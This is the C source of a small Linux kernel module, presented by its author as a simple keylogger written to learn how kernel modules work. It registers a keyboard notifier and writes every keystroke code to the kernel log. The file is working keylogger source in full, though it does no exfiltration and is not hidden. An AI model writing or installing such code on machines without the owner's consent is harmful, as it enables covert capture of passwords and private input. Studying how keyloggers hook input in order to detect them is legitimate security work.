/*
**  Dany Bouca Nova
**      Simple Keylogger to learn how to create a kernel module.
*/

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include "keys.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dany Bouca Nova <dany.boucanova@gmail.com");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");

int		notifier(struct notifier_block *block, unsigned long code, void *parameter)
{
  struct keyboard_notifier_param *param;
  /* unsigned char	buffer[500]; */

  (void)block;
  (void)code;
  param = parameter;
  if (param->value >= 0 && param->value <= 1000)
    printk(KERN_INFO "%d\n", param->value);
  return (0);
}

static struct notifier_block keylogger =
  {
    .notifier_call = notifier
  };

static int	__init keylog_init(void)
{
  register_keyboard_notifier(&keylogger);
  printk(KERN_INFO "Register the Keylogger !\n");
  return (0);
}

static void	__exit keylog_end(void)
{
  unregister_keyboard_notifier(&keylogger);
  printk(KERN_INFO "Unregister the Keylogger !\n");

}

module_init(keylog_init);
module_exit(keylog_end);
